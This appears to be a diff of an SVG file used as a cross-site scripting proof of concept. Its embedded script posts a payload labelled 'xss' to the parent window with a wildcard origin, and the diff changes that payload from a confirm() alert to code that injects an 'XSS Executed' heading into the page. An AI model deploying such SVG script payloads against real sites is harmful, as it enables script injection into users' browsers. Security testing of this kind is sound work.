@@ -1,10 +1,8 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    // نرسل كود JS إلى الصفحة الأب عبر postMessage
     window.parent.postMessage({
-       type: "xss",
-     payload: "confirm('✅ تم تنفيذ XSS عبر postMessage من SVG');"
+      type: "xss",
+      payload: "document.body.insertAdjacentHTML('beforeend', '<h2 style=\"color:red\">✅ XSS Executed</h2>')"
     }, "*");
-
   </script>
 </svg>
